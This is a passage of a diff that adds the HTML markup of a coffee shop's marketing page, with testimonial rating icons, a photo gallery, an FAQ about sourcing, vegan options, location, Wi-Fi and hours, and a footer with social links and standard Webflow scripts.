+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                            </div>
+                            <div class="margin-vertical margin-medium">
+                                <div blocks-name="heading-style-h6" class="heading-style-h5">Dann Good Coffee is my go-to place for a solid cup of joe.</div>
+                            </div>
+                            <div blocks-slot-children="ST232" blocks-name="testimonial6_client" class="home_testimonial_client">
+                                <div blocks-name="testimonial6_client-image-wrapper" class="home_testimonial_client-image">
+                                    <div>P</div>
+                                </div>
+                                <div blocks-slot-children="ST232" blocks-name="testimonial6_client-info" class="home_testimonial_client-info">
+                                    <p blocks-name="paragraph-3" class="text-weight-semibold">Petty</p>
+                                    <p blocks-name="paragraph-2">Just A Guy</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </section>
+        <section class="section_home_gallery"><svg viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-top is-teal-dark"><path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path></svg>
+            <div
+                class="padding-global">
+                <div class="container-large">
+                    <div class="padding-section-large padding-top">
+                        <div class="margin-bottom margin-xlarge">
+                            <div class="text-align-center">
+                                <div blocks-name="max-width-large" blocks-slot-children="ST232" class="max-width-large align-center">
+                                    <div class="margin-bottom margin-small">
+                                        <h2 blocks-name="heading" class="heading-style-h1">Vibrant Moments</h2>
+                                    </div>
+                                    <p blocks-name="paragraph" class="text-size-medium">Experience the thrill of surf, skate, and outdoor adventures.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="w-layout-grid home_gallery_component">
+                            <div class="w-layout-grid home_gallery_row">
+                                <a href="#" id="w-node-_710a3a4b-1044-d2c2-8a07-82864c153764-08858d7f" class="home_gallery_lightbox-link w-inline-block w-lightbox">
+                                    <div class="home_gallery_image-wrapper"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b554fc96f905028aa7f5_Moment-01.webp" loading="lazy" sizes="90vw" srcset="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b554fc96f905028aa7f5_Moment-01-p-500.webp 500w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b554fc96f905028aa7f5_Moment-01-p-800.webp 800w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b554fc96f905028aa7f5_Moment-01-p-1080.webp 1080w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b554fc96f905028aa7f5_Moment-01-p-1600.webp 1600w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b554fc96f905028aa7f5_Moment-01.webp 1920w"
+                                            alt="Vibrant Moments" class="home_gallery_image is-scroll" /></div>
+                                    <script type="application/json" class="w-json">
+                                        {
+                                            "items": [],
+                                            "group": ""
+                                        }
+                                    </script>
+                                </a>
+                                <a href="#" id="w-node-_710a3a4b-1044-d2c2-8a07-82864c153767-08858d7f" class="home_gallery_lightbox-link w-inline-block w-lightbox">
+                                    <div class="home_gallery_image-wrapper"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b5545cb46119be7ff247_Moment-02.webp" loading="lazy" sizes="90vw" srcset="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b5545cb46119be7ff247_Moment-02-p-500.webp 500w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b5545cb46119be7ff247_Moment-02-p-800.webp 800w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b5545cb46119be7ff247_Moment-02-p-1080.webp 1080w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b5545cb46119be7ff247_Moment-02-p-1600.webp 1600w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619b5545cb46119be7ff247_Moment-02.webp 1920w"
+                                            alt="Vibrant Moments" class="home_gallery_image is-scroll" /></div>
+                                    <script type="application/json" class="w-json">
+                                        {
+                                            "items": [],
+                                            "group": ""
+                                        }
+                                    </script>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                </div>
+        </section>
+        <section class="section_home_faq"><svg viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-bottom is-black"><path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path></svg>
+            <div
+                class="padding-global">
+                <div class="container-small">
+                    <div class="padding-section-large">
+                        <div class="margin-bottom margin-xlarge">
+                            <div class="text-align-center">
+                                <div blocks-name="max-width-large" blocks-slot-children="ST232" class="max-width-large">
+                                    <div class="margin-bottom margin-small">
+                                        <h2 blocks-name="heading" class="heading-style-h1">FAQ</h2>
+                                    </div>
+                                    <p blocks-name="paragraph" class="text-size-medium">Find answers to commonly asked questions about our coffee and community.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div blocks-name="faq1_component" blocks-slot-children="ST232" class="home_faq_component">
+                            <div blocks-name="faq1_accordion" class="home_faq_accordion">
+                                <div data-w-id="710a3a4b-1044-d2c2-8a07-82864c153778" class="home_faq_question">
+                                    <h3 class="heading-style-h5">What is your coffee sourced?</h3>
+                                    <div class="home_faq_icon-wrapper">
+                                        <div class="icon-embed-small w-embed"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M16.5303 20.8839C16.2374 21.1768 15.7626 21.1768 15.4697 20.8839L7.82318 13.2374C7.53029 12.9445 7.53029 12.4697 7.82318 12.1768L8.17674 11.8232C8.46963 11.5303 8.9445 11.5303 9.2374 11.8232L16 18.5858L22.7626 11.8232C23.0555 11.5303 23.5303 11.5303 23.8232 11.8232L24.1768 12.1768C24.4697 12.4697 24.4697 12.9445 24.1768 13.2374L16.5303 20.8839Z" fill="currentColor"/>
+</svg></div>
+                                    </div>
+                                </div>
+                                <div style="width:100%;height:0px" class="home_faq_answer">
+                                    <p class="text-color-black">Our coffee is sourced from sustainable farms around the world, ensuring the highest quality and ethical practices.</p>
+                                </div>
+                            </div>
+                            <div blocks-name="faq1_accordion-2" class="home_faq_accordion">
+                                <div data-w-id="710a3a4b-1044-d2c2-8a07-82864c153782" class="home_faq_question">
+                                    <h3 class="heading-style-h5">Do you offer vegan options?</h3>
+                                    <div class="home_faq_icon-wrapper">
+                                        <div class="icon-embed-small w-embed"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M16.5303 20.8839C16.2374 21.1768 15.7626 21.1768 15.4697 20.8839L7.82318 13.2374C7.53029 12.9445 7.53029 12.4697 7.82318 12.1768L8.17674 11.8232C8.46963 11.5303 8.9445 11.5303 9.2374 11.8232L16 18.5858L22.7626 11.8232C23.0555 11.5303 23.5303 11.5303 23.8232 11.8232L24.1768 12.1768C24.4697 12.4697 24.4697 12.9445 24.1768 13.2374L16.5303 20.8839Z" fill="currentColor"/>
+</svg></div>
+                                    </div>
+                                </div>
+                                <div style="width:100%;height:0px" class="home_faq_answer">
+                                    <p class="text-color-black">Yes, we offer a variety of vegan options, including plant-based milk alternatives &amp; vegan pastries.</p>
+                                </div>
+                            </div>
+                            <div blocks-name="faq1_accordion-3" class="home_faq_accordion">
+                                <div data-w-id="710a3a4b-1044-d2c2-8a07-82864c15378c" class="home_faq_question">
+                                    <h3 class="heading-style-h5">Where are you located?</h3>
+                                    <div class="home_faq_icon-wrapper">
+                                        <div class="icon-embed-small w-embed"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M16.5303 20.8839C16.2374 21.1768 15.7626 21.1768 15.4697 20.8839L7.82318 13.2374C7.53029 12.9445 7.53029 12.4697 7.82318 12.1768L8.17674 11.8232C8.46963 11.5303 8.9445 11.5303 9.2374 11.8232L16 18.5858L22.7626 11.8232C23.0555 11.5303 23.5303 11.5303 23.8232 11.8232L24.1768 12.1768C24.4697 12.4697 24.4697 12.9445 24.1768 13.2374L16.5303 20.8839Z" fill="currentColor"/>
+</svg></div>
+                                    </div>
+                                </div>
+                                <div style="width:100%;height:0px" class="home_faq_answer">
+                                    <p class="text-color-black">We are located at 4114 Rad Ave, in the heart of the city. Come visit us!</p>
+                                </div>
+                            </div>
+                            <div blocks-name="faq1_accordion-4" class="home_faq_accordion">
+                                <div data-w-id="710a3a4b-1044-d2c2-8a07-82864c153796" class="home_faq_question">
+                                    <h3 class="heading-style-h5">Do you have Wi-Fi?</h3>
+                                    <div class="home_faq_icon-wrapper">
+                                        <div class="icon-embed-small w-embed"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M16.5303 20.8839C16.2374 21.1768 15.7626 21.1768 15.4697 20.8839L7.82318 13.2374C7.53029 12.9445 7.53029 12.4697 7.82318 12.1768L8.17674 11.8232C8.46963 11.5303 8.9445 11.5303 9.2374 11.8232L16 18.5858L22.7626 11.8232C23.0555 11.5303 23.5303 11.5303 23.8232 11.8232L24.1768 12.1768C24.4697 12.4697 24.4697 12.9445 24.1768 13.2374L16.5303 20.8839Z" fill="currentColor"/>
+</svg></div>
+                                    </div>
+                                </div>
+                                <div style="width:100%;height:0px" class="home_faq_answer">
+                                    <p class="text-color-black">Yes, we offer free Wi-Fi to all our customers. Stay connected while enjoying your coffee.</p>
+                                </div>
+                            </div>
+                            <div blocks-name="faq1_accordion-5" class="home_faq_accordion">
+                                <div data-w-id="710a3a4b-1044-d2c2-8a07-82864c1537a0" class="home_faq_question">
+                                    <h3 class="heading-style-h5">What are your hours?</h3>
+                                    <div class="home_faq_icon-wrapper">
+                                        <div class="icon-embed-small w-embed"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M16.5303 20.8839C16.2374 21.1768 15.7626 21.1768 15.4697 20.8839L7.82318 13.2374C7.53029 12.9445 7.53029 12.4697 7.82318 12.1768L8.17674 11.8232C8.46963 11.5303 8.9445 11.5303 9.2374 11.8232L16 18.5858L22.7626 11.8232C23.0555 11.5303 23.5303 11.5303 23.8232 11.8232L24.1768 12.1768C24.4697 12.4697 24.4697 12.9445 24.1768 13.2374L16.5303 20.8839Z" fill="currentColor"/>
+</svg></div>
+                                    </div>
+                                </div>
+                                <div style="width:100%;height:0px" class="home_faq_answer">
+                                    <p class="text-color-black">We are open every day from 7am to 7pm.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="margin-top margin-xlarge">
+                            <div class="text-align-center">
+                                <div blocks-name="max-width-medium" blocks-slot-children="ST232" class="max-width-medium align-center">
+                                    <div class="margin-bottom margin-xsmall">
+                                        <h4 blocks-name="heading-2">Still have questions?</h4>
+                                    </div>
+                                    <p blocks-name="paragraph-2" class="text-size-medium">Contact us for more information.</p>
+                                    <div class="margin-top margin-medium"><a blocks-name="button" href="#" class="button is-secondary w-button">Contact</a></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                </div>
+        </section>
+        </main>
+        <footer class="footer4_component">
+            <div class="padding-global">
+                <div class="container-large">
+                    <div class="padding-vertical padding-xxlarge">
+                        <div class="padding-bottom padding-xxlarge">
+                            <div class="w-layout-grid footer4_top-wrapper"><a href="/" id="w-node-_73ccc6b6-66cb-933a-8e37-88aa6e1286b0-6e1286aa" aria-current="page" class="footer4_logo-link w-nav-brand w--current"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a61a449a86202b0235dd_Dann-Good-Coffee-Logo-Light.svg" loading="lazy" alt="Dann Good Coffee"/></a>
+                                <div
+                                    blocks-name="footer4_link-list" blocks-slot-children="ST232" class="w-layout-grid footer4_link-list"><a blocks-name="footer4_link-2" href="#" class="footer4_link">Menu</a><a blocks-name="footer4_link-3" href="#" class="footer4_link">Shop</a><a blocks-name="footer4_link" href="#" class="footer4_link">About</a><a blocks-name="footer4_link-4"
+                                        href="#" class="footer4_link">Order</a></div>
+                            <div blocks-name="footer4_social-list" blocks-slot-children="ST232" id="w-node-_73ccc6b6-66cb-933a-8e37-88aa6e1286bd-6e1286aa" class="w-layout-grid footer4_social-list">
+                                <a blocks-name="footer4_social-link-3" href="#" class="footer4_social-link w-inline-block">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M17.1761 4H19.9362L13.9061 10.7774L21 20H15.4456L11.0951 14.4066L6.11723 20H3.35544L9.80517 12.7508L3 4H8.69545L12.6279 9.11262L17.1761 4ZM16.2073 18.3754H17.7368L7.86441 5.53928H6.2232L16.2073 18.3754Z" fill="CurrentColor"/>
+</svg></div>
+                                </a>
+                                <a blocks-name="footer4_social-link-2" href="#" class="footer4_social-link w-inline-block">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M16 3H8C5.23858 3 3 5.23858 3 8V16C3 18.7614 5.23858 21 8 21H16C18.7614 21 21 18.7614 21 16V8C21 5.23858 18.7614 3 16 3ZM19.25 16C19.2445 17.7926 17.7926 19.2445 16 19.25H8C6.20735 19.2445 4.75549 17.7926 4.75 16V8C4.75549 6.20735 6.20735 4.75549 8 4.75H16C17.7926 4.75549 19.2445 6.20735 19.25 8V16ZM16.75 8.25C17.3023 8.25 17.75 7.80228 17.75 7.25C17.75 6.69772 17.3023 6.25 16.75 6.25C16.1977 6.25 15.75 6.69772 15.75 7.25C15.75 7.80228 16.1977 8.25 16.75 8.25ZM12 7.5C9.51472 7.5 7.5 9.51472 7.5 12C7.5 14.4853 9.51472 16.5 12 16.5C14.4853 16.5 16.5 14.4853 16.5 12C16.5027 10.8057 16.0294 9.65957 15.1849 8.81508C14.3404 7.97059 13.1943 7.49734 12 7.5ZM9.25 12C9.25 13.5188 10.4812 14.75 12 14.75C13.5188 14.75 14.75 13.5188 14.75 12C14.75 10.4812 13.5188 9.25 12 9.25C10.4812 9.25 9.25 10.4812 9.25 12Z" fill="CurrentColor"/>
+</svg></div>
+                                </a>
+                                <a blocks-name="footer4_social-link-5" href="#" class="footer4_social-link w-inline-block">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M20.5686 4.77345C21.5163 5.02692 22.2555 5.76903 22.5118 6.71673C23.1821 9.42042 23.1385 14.5321 22.5259 17.278C22.2724 18.2257 21.5303 18.965 20.5826 19.2213C17.9071 19.8831 5.92356 19.8015 3.40294 19.2213C2.45524 18.9678 1.71595 18.2257 1.45966 17.278C0.827391 14.7011 0.871044 9.25144 1.44558 6.73081C1.69905 5.78311 2.44116 5.04382 3.38886 4.78753C6.96561 4.0412 19.2956 4.282 20.5686 4.77345ZM9.86682 8.70227L15.6122 11.9974L9.86682 15.2925V8.70227Z" fill="CurrentColor"/>
+</svg></div>
+                                </a>
+                                <a blocks-name="footer4_social-link" href="#" class="footer4_social-link w-inline-block">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M22 12.0611C22 6.50451 17.5229 2 12 2C6.47715 2 2 6.50451 2 12.0611C2 17.0828 5.65684 21.2452 10.4375 22V14.9694H7.89844V12.0611H10.4375V9.84452C10.4375 7.32296 11.9305 5.93012 14.2146 5.93012C15.3088 5.93012 16.4531 6.12663 16.4531 6.12663V8.60261H15.1922C13.95 8.60261 13.5625 9.37822 13.5625 10.1739V12.0611H16.3359L15.8926 14.9694H13.5625V22C18.3432 21.2452 22 17.083 22 12.0611Z" fill="CurrentColor"/>
+</svg></div>
+                                </a>
+                                <a blocks-name="footer4_social-link-4" href="#" class="footer4_social-link w-inline-block">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path fill-rule="evenodd" clip-rule="evenodd" d="M4.5 3C3.67157 3 3 3.67157 3 4.5V19.5C3 20.3284 3.67157 21 4.5 21H19.5C20.3284 21 21 20.3284 21 19.5V4.5C21 3.67157 20.3284 3 19.5 3H4.5ZM8.52076 7.00272C8.52639 7.95897 7.81061 8.54819 6.96123 8.54397C6.16107 8.53975 5.46357 7.90272 5.46779 7.00413C5.47201 6.15897 6.13998 5.47975 7.00764 5.49944C7.88795 5.51913 8.52639 6.1646 8.52076 7.00272ZM12.2797 9.76176H9.75971H9.7583V18.3216H12.4217V18.1219C12.4217 17.742 12.4214 17.362 12.4211 16.9819V16.9818V16.9816V16.9815V16.9812C12.4203 15.9674 12.4194 14.9532 12.4246 13.9397C12.426 13.6936 12.4372 13.4377 12.5005 13.2028C12.7381 12.3253 13.5271 11.7586 14.4074 11.8979C14.9727 11.9864 15.3467 12.3141 15.5042 12.8471C15.6013 13.1803 15.6449 13.5389 15.6491 13.8863C15.6605 14.9339 15.6589 15.9815 15.6573 17.0292V17.0294C15.6567 17.3992 15.6561 17.769 15.6561 18.1388V18.3202H18.328V18.1149C18.328 17.6629 18.3278 17.211 18.3275 16.7591V16.759V16.7588C18.327 15.6293 18.3264 14.5001 18.3294 13.3702C18.3308 12.8597 18.276 12.3563 18.1508 11.8627C17.9638 11.1286 17.5771 10.5211 16.9485 10.0824C16.5027 9.77019 16.0133 9.5691 15.4663 9.5466C15.404 9.54401 15.3412 9.54062 15.2781 9.53721L15.2781 9.53721L15.2781 9.53721C14.9984 9.52209 14.7141 9.50673 14.4467 9.56066C13.6817 9.71394 13.0096 10.0641 12.5019 10.6814C12.4429 10.7522 12.3852 10.8241 12.2991 10.9314L12.2991 10.9315L12.2797 10.9557V9.76176ZM5.68164 18.3244H8.33242V9.76733H5.68164V18.3244Z" fill="CurrentColor"/>
+</svg></div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="line-divider"></div>
+                    <div class="padding-top padding-medium">
+                        <div blocks-name="footer4_bottom-wrapper" blocks-slot-children="ST232" class="w-layout-grid footer4_bottom-wrapper">
+                            <div blocks-name="footer4_credit-text" id="w-node-_73ccc6b6-66cb-933a-8e37-88aa6e1286cb-6e1286aa" class="footer4_credit-text">© 2024 Dann Good Coffee</div><a blocks-name="footer4_legal-link" href="#" class="footer4_legal-link">Privacy Policy</a><a blocks-name="footer4_legal-link-2" href="#" class="footer4_legal-link">Terms of Service</a><a blocks-name="footer4_legal-link-3"
+                                href="https://phd.so/" target="_blank" class="footer4_legal-link">Coffee Settings</a></div>
+                    </div>
+                </div>
+            </div>
+            </div><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a61ab4e3c6e682f584a9_Thats-Dann-Good-Light.svg" loading="lazy" alt="That’s Dann Good" class="footer4_tagline" /></footer>
+        </div>
+        <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=6610c4fb8d400b1408858d2e" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+        <script src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/js/webflow.35f39d942.js" type="text/javascript"></script>
 </body>
 
 </html>
